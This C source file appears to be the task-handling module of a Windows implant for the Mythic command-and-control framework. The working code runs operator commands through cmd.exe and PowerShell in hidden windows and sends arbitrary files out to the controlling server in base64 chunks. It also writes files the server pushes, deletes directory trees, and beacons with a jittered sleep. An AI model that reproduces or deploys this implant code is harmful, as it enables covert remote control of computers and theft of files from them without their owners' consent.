#include "common.h"
#include "config.h"
#include "crypto.h"
#include "mythic.h"
#include "tasks.h"
#include <stdarg.h>

#define XFER_CHUNK_DEFAULT 512000
#define XFER_CHUNK_SMALL 8192
#define XFER_MAX_CHUNKS 100000

int xfer_chunk_size(const char *profile) {
    if (profile && (strcmp(profile, "dns") == 0 || strcmp(profile, "msteams") == 0))
        return XFER_CHUNK_SMALL;
    return XFER_CHUNK_DEFAULT;
}

/* Run `prog /c arg`, capture combined output (caller frees). */
static char *run_capture(const char *prog, const char *arg, int *exit_code) {
    SECURITY_ATTRIBUTES sa;
    HANDLE rfd = NULL, wfd = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    char cmd[8192], *out = NULL;
    size_t len = 0, cap = 0;
    DWORD got = 0;
    *exit_code = -1;
    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&rfd, &wfd, &sa, 0))
        return NULL;
    if (!SetHandleInformation(rfd, HANDLE_FLAG_INHERIT, 0)) {
        CloseHandle(rfd);
        CloseHandle(wfd);
        return NULL;
    }
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = wfd;
    si.hStdError = wfd;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));
    snprintf(cmd, sizeof(cmd), "%s /c %s", prog, arg ? arg : "");
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(rfd);
        CloseHandle(wfd);
        return NULL;
    }
    CloseHandle(wfd);
    CloseHandle(pi.hThread);
    out = (char *)malloc(4096);
    if (!out) {
        CloseHandle(rfd);
        CloseHandle(pi.hProcess);
        return NULL;
    }
    cap = 4096;
    for (;;) {
        if (len + 1024 > cap) {
            char *grown = (char *)realloc(out, cap * 2);
            if (!grown)
                break;
            out = grown;
            cap *= 2;
        }
        if (!ReadFile(rfd, out + len, 1023, &got, NULL) || got == 0)
            break;
        len += got;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    {
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        *exit_code = (int)code;
    }
    CloseHandle(rfd);
    CloseHandle(pi.hProcess);
    out[len] = '\0';
    return out;
}

/* Parse "interval [jitter]". */
static int parse_sleep(const char *arg, int *interval, int *jitter) {
    char *end = NULL;
    long iv, jt = 0;
    if (!arg || *arg == '\0')
        return -1;
    iv = strtol(arg, &end, 10);
    if (end == arg || iv < 0 || iv > 8640000)
        return -1;
    while (*end == ' ' || *end == '\t')
        end++;
    if (*end != '\0') {
        jt = strtol(end, &end, 10);
        if (jt < 0 || jt > 100)
            return -1;
    }
    *interval = (int)iv;
    *jitter = (int)jt;
    return 0;
}

/* Membership test over a comma-separated command list ("a,b"). Matches
 * whole entries only; an empty list allows everything. */
/* Extract one named string from a parameters blob ("" when absent). */
static const char *task_param(const char *parameters, const char *key, char *scratch, size_t cap) {
    cJSON *root, *v;
    if (cap > 0)
        scratch[0] = '\0';
    if (!parameters)
        parameters = "";
    root = cJSON_Parse(parameters);
    if (!root)
        return "";
    v = cJSON_GetObjectItemCaseSensitive(root, key);
    if (v && cJSON_IsString(v) && v->valuestring) {
        strncpy(scratch, v->valuestring, cap - 1);
        scratch[cap - 1] = '\0';
        cJSON_Delete(root);
        return scratch;
    }
    cJSON_Delete(root);
    return "";
}

static unsigned long long filetime_to_unix(const FILETIME *ft) {
    ULARGE_INTEGER u;
    u.LowPart = ft->dwLowDateTime;
    u.HighPart = ft->dwHighDateTime;
    if (u.QuadPart < 116444736000000000ULL)
        return 0;
    return (u.QuadPart - 116444736000000000ULL) / 10000000ULL;
}

static cJSON *perms_obj(DWORD attrs) {
    cJSON *o = cJSON_CreateObject();
    if (o)
        cJSON_AddBoolToObject(o, "read_only", (attrs & FILE_ATTRIBUTE_READONLY) != 0);
    return o;
}

/* Split an absolute path into parent dir + base name for file_browser. */
static void split_parent(const char *abs, char *parent, size_t pcap, char *name, size_t ncap) {
    char tmp[MAX_PATH];
    const char *slash, *slash2, *base;
    size_t n, plen;
    strncpy(tmp, abs, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    n = strlen(tmp);
    while (n > 0 && (tmp[n - 1] == '\\' || tmp[n - 1] == '/'))
        tmp[--n] = '\0';
    slash = strrchr(tmp, '\\');
    slash2 = strrchr(tmp, '/');
    if (slash2 && (!slash || slash2 > slash))
        slash = slash2;
    parent[0] = '\0';
    base = tmp;
    if (slash) {
        plen = (size_t)(slash - tmp);
        if (plen < pcap) {
            memcpy(parent, tmp, plen);
            parent[plen] = '\0';
        }
        base = slash + 1;
    }
    strncpy(name, base, ncap - 1);
    name[ncap - 1] = '\0';
}

int command_in_list(const char *list, const char *name) {
    size_t namelen;
    const char *p;
    if (!list || *list == '\0')
        return 1;
    if (!name || *name == '\0')
        return 0;
    namelen = strlen(name);
    p = list;
    while (*p) {
        const char *start, *end;
        while (*p == ' ' || *p == '\t' || *p == ',')
            p++;
        if (*p == '\0')
            break;
        start = p;
        while (*p && *p != ',')
            p++;
        end = p;
        while (end > start && (end[-1] == ' ' || end[-1] == '\t'))
            end--;
        if ((size_t)(end - start) == namelen && memcmp(start, name, namelen) == 0)
            return 1;
    }
    return 0;
}

/* List dir, one entry per line ("name/" for subdirs). Caller frees *out. */
static int run_ls(const char *dir, char **out) {
    char pattern[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    char *buf = NULL;
    size_t len = 0, cap = 0, dlen;
    *out = NULL;
    if (!dir || *dir == '\0')
        dir = ".";
    dlen = strlen(dir);
    if (dlen + 3 >= sizeof(pattern))
        return -1;
    memcpy(pattern, dir, dlen);
    if (dlen > 0 && (dir[dlen - 1] == '\\' || dir[dlen - 1] == '/'))
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "*");
    else
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "\\*");
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return -1;
    buf = (char *)malloc(4096);
    if (!buf) {
        FindClose(h);
        return -1;
    }
    cap = 4096;
    buf[0] = '\0';
    do {
        size_t n;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        n = strlen(fd.cFileName) + 3;
        if (len + n > cap) {
            char *grown = (char *)realloc(buf, cap * 2);
            if (!grown)
                break;
            buf = grown;
            cap *= 2;
        }
        len += (size_t)snprintf(buf + len, cap - len, "%s%s\n", fd.cFileName,
                                (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "/" : "");
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    *out = buf;
    return 0;
}

/* Build the file_browser object for dir (abs = its absolute path). */
static cJSON *ls_browser(const char *dir, const char *abs) {
    char pattern[MAX_PATH], parent[MAX_PATH], name[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    cJSON *fb = NULL, *files = NULL;
    DWORD attrs;
    size_t dlen;
    if (!dir || *dir == '\0')
        dir = ".";
    dlen = strlen(dir);
    if (dlen + 3 >= sizeof(pattern))
        return NULL;
    memcpy(pattern, dir, dlen);
    if (dlen > 0 && (dir[dlen - 1] == '\\' || dir[dlen - 1] == '/'))
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "*");
    else
        snprintf(pattern + dlen, sizeof(pattern) - dlen, "\\*");
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return NULL;
    fb = cJSON_CreateObject();
    files = cJSON_CreateArray();
    if (!fb || !files) {
        FindClose(h);
        cJSON_Delete(fb);
        cJSON_Delete(files);
        return NULL;
    }
    split_parent(abs, parent, sizeof(parent), name, sizeof(name));
    cJSON_AddStringToObject(fb, "host", "");
    cJSON_AddBoolToObject(fb, "is_file", 0);
    cJSON_AddStringToObject(fb, "name", name);
    cJSON_AddStringToObject(fb, "parent_path", parent);
    cJSON_AddBoolToObject(fb, "success", 1);
    cJSON_AddNumberToObject(fb, "size", 0);
    cJSON_AddNumberToObject(fb, "modify_time", 0);
    attrs = GetFileAttributesA(dir);
    cJSON_AddItemToObject(fb, "permissions", perms_obj(attrs == INVALID_FILE_ATTRIBUTES ? 0 : attrs));
    do {
        cJSON *child;
        ULARGE_INTEGER sz;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        child = cJSON_CreateObject();
        if (!child)
            continue;
        cJSON_AddBoolToObject(child, "is_file",
                              (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0);
        cJSON_AddStringToObject(child, "name", fd.cFileName);
        sz.LowPart = fd.nFileSizeLow;
        sz.HighPart = fd.nFileSizeHigh;
        cJSON_AddNumberToObject(child, "size", (double)sz.QuadPart);
        cJSON_AddNumberToObject(child, "access_time", (double)filetime_to_unix(&fd.ftLastAccessTime));
        cJSON_AddNumberToObject(child, "modify_time", (double)filetime_to_unix(&fd.ftLastWriteTime));
        cJSON_AddItemToObject(child, "permissions", perms_obj(fd.dwFileAttributes));
        cJSON_AddItemToArray(files, child);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    cJSON_AddItemToObject(fb, "files", files);
    return fb;
}

typedef int (*task_fn_t)(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now);

static int task_shell(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    int code = 0;
    (void)a;
    (void)exit_now;
    *output = run_capture("cmd.exe", arg, &code);
    if (!*output) {
        resp->status = "error: exec failed";
        return 0;
    }
    resp->user_output = *output;
    if (code != 0)
        resp->status = "error: non-zero exit";
    return 0;
}

static int task_powershell(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    int code = 0;
    (void)a;
    (void)exit_now;
    *output = run_capture("powershell.exe", arg, &code);
    if (!*output) {
        resp->status = "error: exec failed";
        return 0;
    }
    resp->user_output = *output;
    if (code != 0)
        resp->status = "error: non-zero exit";
    return 0;
}

static int task_sleep_cmd(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    int iv = 0, jt = 0;
    (void)exit_now;
    if (parse_sleep(arg, &iv, &jt) != 0) {
        resp->status = "error: usage: sleep <interval> [jitter]";
        resp->user_output = resp->status;
        return 0;
    }
    a->interval = iv;
    a->jitter = jt;
    *output = (char *)malloc(64);
    if (*output) {
        snprintf(*output, 64, "sleep set to %ds jitter %d%%", iv, jt);
        resp->user_output = *output;
    }
    return 0;
}

static int task_ls(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char full[MAX_PATH];
    DWORD n;
    cJSON *fb, *wrap;
    (void)a;
    (void)exit_now;
    if (!arg || !*arg)
        arg = ".";
    if (run_ls(arg, output) != 0) {
        *output = (char *)malloc(512);
        if (*output) {
            snprintf(*output, 512, "error: cannot list %.400s", arg);
            resp->status = *output;
        } else {
            resp->status = "error: ls failed";
        }
        resp->user_output = resp->status;
        return 0;
    }
    resp->user_output = *output;
    n = GetFullPathNameA(arg, sizeof(full), full, NULL);
    if (n == 0 || n >= sizeof(full))
        return 0; /* text listing only */
    fb = ls_browser(arg, full);
    if (!fb)
        return 0;
    wrap = cJSON_CreateObject();
    if (!wrap) {
        cJSON_Delete(fb);
        return 0;
    }
    cJSON_AddItemToObject(wrap, "file_browser", fb);
    resp->extra_json = cJSON_PrintUnformatted(wrap);
    cJSON_Delete(wrap);
    return 0;
}

static int failf(response_t *resp, char **output, const char *fmt, ...) {
    va_list ap;
    *output = (char *)malloc(512);
    if (*output) {
        va_start(ap, fmt);
        vsnprintf(*output, 512, fmt, ap);
        va_end(ap);
        resp->status = *output;
    } else {
        resp->status = "error: out of memory";
    }
    resp->user_output = resp->status;
    return 0;
}

/* Post one transfer fragment, returning the task's reply (caller deletes
 * the reply root) or NULL. errbuf carries the failure reason. */
static cJSON *xfer_post(agent_t *a, response_t *resp, cJSON *obj, const char *key,
                        char *errbuf, size_t errcap) {
    cJSON *wrap, *reply, *r;
    response_t cr;
    wrap = cJSON_CreateObject();
    if (!wrap) {
        snprintf(errbuf, errcap, "out of memory");
        return NULL;
    }
    cJSON_AddItemToObject(wrap, key, obj);
    memset(&cr, 0, sizeof(cr));
    cr.task_id = resp->task_id;
    cr.user_output = "";
    cr.status = "success";
    cr.extra_json = cJSON_PrintUnformatted(wrap);
    cJSON_Delete(wrap);
    if (!cr.extra_json) {
        snprintf(errbuf, errcap, "out of memory");
        return NULL;
    }
    reply = agent_post_responses_raw(a, &cr, 1);
    free(cr.extra_json);
    if (!reply) {
        snprintf(errbuf, errcap, "post failed");
        return NULL;
    }
    r = post_reply_find(reply, resp->task_id);
    if (!r) {
        snprintf(errbuf, errcap, "no reply for task");
        cJSON_Delete(reply);
        return NULL;
    }
    if (strcmp(json_str(r, "status"), "error") == 0) {
        const char *e = json_str(r, "error");
        snprintf(errbuf, errcap, "%s", e[0] ? e : "mythic error");
        cJSON_Delete(reply);
        return NULL;
    }
    return reply; /* caller reads fields, then deletes */
}

static int task_download(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char full[MAX_PATH], name[MAX_PATH], parent[MAX_PATH], file_id[64], err[256];
    HANDLE h;
    LARGE_INTEGER sz;
    DWORD attrs, n;
    int chunk_size, total, chunk;
    unsigned char *buf = NULL;
    (void)exit_now;
    if (!arg || !*arg)
        return failf(resp, output, "error: no path");
    n = GetFullPathNameA(arg, sizeof(full), full, NULL);
    if (n == 0 || n >= sizeof(full))
        return failf(resp, output, "error: bad path %.400s", arg);
    attrs = GetFileAttributesA(arg);
    if (attrs == INVALID_FILE_ATTRIBUTES)
        return failf(resp, output, "error: cannot open %.400s", arg);
    if (attrs & FILE_ATTRIBUTE_DIRECTORY)
        return failf(resp, output, "error: not a file: %.400s", arg);
    h = CreateFileA(arg, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return failf(resp, output, "error: cannot open %.400s", arg);
    if (!GetFileSizeEx(h, &sz)) {
        CloseHandle(h);
        return failf(resp, output, "error: cannot stat %.400s", arg);
    }
    split_parent(full, parent, sizeof(parent), name, sizeof(name));
    chunk_size = xfer_chunk_size(a->cfg.profile);
    total = sz.QuadPart == 0 ? 0 : (int)((sz.QuadPart + chunk_size - 1) / chunk_size);
    if (total > XFER_MAX_CHUNKS) {
        CloseHandle(h);
        return failf(resp, output, "error: file needs %d chunks, over the %d limit",
                     total, XFER_MAX_CHUNKS);
    }
    file_id[0] = '\0';
    if (total == 0) {
        cJSON *dl = cJSON_CreateObject(), *reply;
        if (!dl) {
            CloseHandle(h);
            return failf(resp, output, "error: out of memory");
        }
        cJSON_AddNumberToObject(dl, "total_chunks", 0);
        cJSON_AddStringToObject(dl, "full_path", full);
        cJSON_AddStringToObject(dl, "filename", name);
        reply = xfer_post(a, resp, dl, "download", err, sizeof(err));
        if (!reply) {
            CloseHandle(h);
            return failf(resp, output, "error: %s", err);
        }
        cJSON_Delete(reply);
        CloseHandle(h);
        *output = (char *)malloc(512);
        if (!*output)
            return failf(resp, output, "error: out of memory");
        snprintf(*output, 512, "downloaded %s (0 bytes)", arg);
        resp->user_output = *output;
        return 0;
    }
    buf = (unsigned char *)malloc((size_t)chunk_size);
    if (!buf) {
        CloseHandle(h);
        return failf(resp, output, "error: out of memory");
    }
    for (chunk = 1; chunk <= total; chunk++) {
        DWORD got = 0;
        char *b64 = NULL;
        size_t b64len = 0;
        cJSON *dl, *reply, *r;
        if (!ReadFile(h, buf, (DWORD)chunk_size, &got, NULL) || got == 0) {
            free(buf);
            CloseHandle(h);
            return failf(resp, output, "error: short read at chunk %d", chunk);
        }
        b64 = b64_encode(buf, got, &b64len);
        dl = cJSON_CreateObject();
        if (!b64 || !dl) {
            free(b64);
            cJSON_Delete(dl);
            free(buf);
            CloseHandle(h);
            return failf(resp, output, "error: out of memory");
        }
        cJSON_AddNumberToObject(dl, "chunk_num", chunk);
        cJSON_AddStringToObject(dl, "chunk_data", b64);
        free(b64);
        if (chunk == 1) {
            cJSON_AddNumberToObject(dl, "total_chunks", total);
            cJSON_AddNumberToObject(dl, "chunk_size", chunk_size);
            cJSON_AddStringToObject(dl, "full_path", full);
            cJSON_AddStringToObject(dl, "filename", name);
        } else {
            cJSON_AddStringToObject(dl, "file_id", file_id);
        }
        reply = xfer_post(a, resp, dl, "download", err, sizeof(err));
        if (!reply) {
            free(buf);
            CloseHandle(h);
            return failf(resp, output, "error: %s at chunk %d", err, chunk);
        }
        r = post_reply_find(reply, resp->task_id);
        if (chunk == 1) {
            strncpy(file_id, json_str(r, "file_id"), sizeof(file_id) - 1);
            file_id[sizeof(file_id) - 1] = '\0';
            if (file_id[0] == '\0') {
                cJSON_Delete(reply);
                free(buf);
                CloseHandle(h);
                return failf(resp, output, "error: mythic issued no file_id");
            }
        }
        cJSON_Delete(reply);
    }
    free(buf);
    CloseHandle(h);
    *output = (char *)malloc(512);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 512, "downloaded %s (%I64d bytes in %d chunks)", arg, sz.QuadPart, total);
    resp->user_output = *output;
    return 0;
}

static int mkdir_all(const char *path);

static int task_upload(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char file_id[128], remote[MAX_PATH], dir[MAX_PATH], err[256];
    HANDLE h;
    int chunk_size, chunk, total;
    long long written = 0;
    char *slash, *slash2;
    (void)exit_now;
    task_param(arg, "file", file_id, sizeof(file_id));
    {
        char rscratch[MAX_PATH];
        const char *r = task_param(arg, "remote_path", rscratch, sizeof(rscratch));
        strncpy(remote, r, sizeof(remote) - 1);
        remote[sizeof(remote) - 1] = '\0';
    }
    if (file_id[0] == '\0')
        return failf(resp, output, "error: no file id");
    if (remote[0] == '\0')
        return failf(resp, output, "error: no remote path");
    chunk_size = xfer_chunk_size(a->cfg.profile);
    strncpy(dir, remote, sizeof(dir) - 1);
    dir[sizeof(dir) - 1] = '\0';
    slash = strrchr(dir, '\\');
    slash2 = strrchr(dir, '/');
    if (slash2 && (!slash || slash2 > slash))
        slash = slash2;
    if (slash && slash != dir) {
        *slash = '\0';
        if (mkdir_all(dir) != 0)
            return failf(resp, output, "error: cannot create %.400s", dir);
    }
    h = CreateFileA(remote, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return failf(resp, output, "error: cannot create %.400s", remote);
    for (chunk = 1;; chunk++) {
        cJSON *ul, *reply, *r;
        unsigned char *raw = NULL;
        size_t rawlen = 0;
        DWORD wrote = 0;
        ul = cJSON_CreateObject();
        if (!ul) {
            CloseHandle(h);
            return failf(resp, output, "error: out of memory");
        }
        cJSON_AddNumberToObject(ul, "chunk_num", chunk);
        cJSON_AddNumberToObject(ul, "chunk_size", chunk_size);
        cJSON_AddStringToObject(ul, "file_id", file_id);
        reply = xfer_post(a, resp, ul, "upload", err, sizeof(err));
        if (!reply) {
            CloseHandle(h);
            return failf(resp, output, "error: %s at chunk %d", err, chunk);
        }
        r = post_reply_find(reply, resp->task_id);
        total = (int)json_num(r, "total_chunks");
        if (total <= 0 || total > XFER_MAX_CHUNKS) {
            cJSON_Delete(reply);
            CloseHandle(h);
            return failf(resp, output, "error: bad total_chunks %d", total);
        }
        raw = b64_decode(json_str(r, "chunk_data"), &rawlen);
        cJSON_Delete(reply);
        if (!raw && rawlen != 0) {
            CloseHandle(h);
            return failf(resp, output, "error: bad chunk %d encoding", chunk);
        }
        if (rawlen > 0 && (!WriteFile(h, raw, (DWORD)rawlen, &wrote, NULL) || wrote != rawlen)) {
            free(raw);
            CloseHandle(h);
            return failf(resp, output, "error: write failed at chunk %d", chunk);
        }
        free(raw);
        written += (long long)wrote;
        if (chunk >= total)
            break;
    }
    CloseHandle(h);
    *output = (char *)malloc(512);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 512, "uploaded %s (%I64d bytes in %d chunks)", remote, written, total);
    resp->user_output = *output;
    return 0;
}

static int mkdir_all(const char *path) {
    char tmp[MAX_PATH];
    size_t i, n;
    DWORD attrs = GetFileAttributesA(path);
    if (attrs != INVALID_FILE_ATTRIBUTES)
        return (attrs & FILE_ATTRIBUTE_DIRECTORY) ? 0 : -1;
    strncpy(tmp, path, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    n = strlen(tmp);
    for (i = 0; i < n; i++) {
        if (tmp[i] == '\\' || tmp[i] == '/') {
            char save;
            if (i == 2 && tmp[1] == ':')
                continue; /* drive root */
            save = tmp[i];
            tmp[i] = '\0';
            if (tmp[0] != '\0' && GetFileAttributesA(tmp) == INVALID_FILE_ATTRIBUTES)
                CreateDirectoryA(tmp, NULL);
            tmp[i] = save;
        }
    }
    if (CreateDirectoryA(path, NULL))
        return 0;
    return GetLastError() == ERROR_ALREADY_EXISTS ? 0 : -1;
}

static int rm_tree(const char *path) {
    char pattern[MAX_PATH], child[MAX_PATH], base[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    DWORD attrs = GetFileAttributesA(path);
    size_t len;
    if (attrs == INVALID_FILE_ATTRIBUTES)
        return -1;
    if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileA(path) ? 0 : -1;
    }
    strncpy(base, path, sizeof(base) - 1);
    base[sizeof(base) - 1] = '\0';
    len = strlen(base);
    while (len > 0 && (base[len - 1] == '\\' || base[len - 1] == '/'))
        base[--len] = '\0';
    if (len + 3 >= sizeof(pattern))
        return -1;
    snprintf(pattern, sizeof(pattern), "%s\\*", base);
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return -1;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        snprintf(child, sizeof(child), "%s\\%s", base, fd.cFileName);
        if (rm_tree(child) != 0) {
            FindClose(h);
            return -1;
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
    return RemoveDirectoryA(path) ? 0 : -1;
}

static int task_rm(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    char full[MAX_PATH];
    DWORD n;
    cJSON *arr, *one, *wrap;
    (void)a;
    (void)exit_now;
    if (!arg || !*arg)
        return failf(resp, output, "error: no path");
    if (rm_tree(arg) != 0)
        return failf(resp, output, "error: cannot remove %.400s", arg);
    n = GetFullPathNameA(arg, sizeof(full), full, NULL);
    if (n == 0 || n >= sizeof(full)) {
        strncpy(full, arg, sizeof(full) - 1);
        full[sizeof(full) - 1] = '\0';
    }
    arr = cJSON_CreateArray();
    one = cJSON_CreateObject();
    wrap = cJSON_CreateObject();
    if (!arr || !one || !wrap) {
        cJSON_Delete(arr);
        cJSON_Delete(one);
        cJSON_Delete(wrap);
        return failf(resp, output, "error: out of memory");
    }
    cJSON_AddStringToObject(one, "path", full);
    cJSON_AddItemToArray(arr, one);
    cJSON_AddItemToObject(wrap, "removed_files", arr);
    resp->extra_json = cJSON_PrintUnformatted(wrap);
    cJSON_Delete(wrap);
    *output = (char *)malloc(512);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 512, "removed %s", arg);
    resp->user_output = *output;
    return 0;
}

static int task_mkdir(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    (void)a;
    (void)exit_now;
    if (!arg || !*arg)
        return failf(resp, output, "error: no path");
    if (mkdir_all(arg) != 0)
        return failf(resp, output, "error: cannot create %.400s", arg);
    *output = (char *)malloc(512);
    if (!*output)
        return failf(resp, output, "error: out of memory");
    snprintf(*output, 512, "created %s", arg);
    resp->user_output = *output;
    return 0;
}

static int task_exit(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
    (void)a;
    (void)arg;
    (void)output;
    resp->user_output = "exiting";
    *exit_now = 1;
    return 0;
}

/* Dispatch table. To add a command, add a row plus a task_* handler here,
 * a row in the Go table (agent_code/tasks.go) and a row in the container
 * commandSpecs. */
static const struct {
    const char *name;
    task_fn_t fn;
} task_table[] = {
    {"shell", task_shell},
    {"powershell", task_powershell},
    {"sleep", task_sleep_cmd},
    {"ls", task_ls},
    {"download", task_download},
    {"upload", task_upload},
    {"rm", task_rm},
    {"mkdir", task_mkdir},
    {"exit", task_exit},
};

int task_dispatch(agent_t *a, const task_t *t, response_t *resp, char **output, int *exit_now) {
    char scratch[8192];
    const char *arg;
    size_t i;
    *output = NULL;
    *exit_now = 0;
    resp->task_id = t->id;
    resp->user_output = "";
    resp->completed = 1;
    resp->status = "success";
    resp->extra_json = NULL;
    arg = task_arg(t->parameters, scratch, sizeof(scratch));
    for (i = 0; i < sizeof(task_table) / sizeof(task_table[0]); i++) {
        if (strcmp(t->command, task_table[i].name) == 0) {
            if (!command_in_list(CFG_COMMANDS, t->command)) {
                *output = (char *)malloc(128);
                if (*output) {
                    snprintf(*output, 128, "error: command %.32s not included in this build",
                             t->command);
                    resp->status = *output;
                } else {
                    resp->status = "error: command not included in this build";
                }
                resp->user_output = resp->status;
                return 0;
            }
            return task_table[i].fn(a, arg, resp, output, exit_now);
        }
    }
    resp->status = "error: unknown command";
    resp->user_output = resp->status;
    return 0;
}

void task_sleep(int interval, int jitter) {
    int ms, delta, low, span;
    if (interval <= 0)
        return;
    if (jitter <= 0) {
        Sleep((DWORD)interval * 1000);
        return;
    }
    delta = interval * jitter / 100;
    low = interval - delta;
    if (low < 0)
        low = 0;
    span = interval + delta - low;
    ms = low + (span > 0 ? rand() % (span + 1) : 0);
    Sleep((DWORD)ms * 1000);
}
